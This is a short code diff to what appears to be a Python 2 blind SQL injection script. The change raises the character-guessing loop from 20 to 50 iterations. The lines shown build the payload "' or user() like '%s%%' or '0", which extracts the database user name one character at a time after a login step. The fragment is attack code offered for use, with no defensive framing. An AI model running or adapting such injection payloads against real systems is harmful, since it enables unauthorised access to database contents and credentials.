@@ -47,7 +47,7 @@ def do_query(s,c):
 r = do_login()
 
 match = ''
-for n in xrange(20):
+for n in xrange(50):
 	found = False
 	for c in string.digits + '@_*' + string.letters:
 		payload = "' or user() like '%s%%' or '0" % str(match+c)
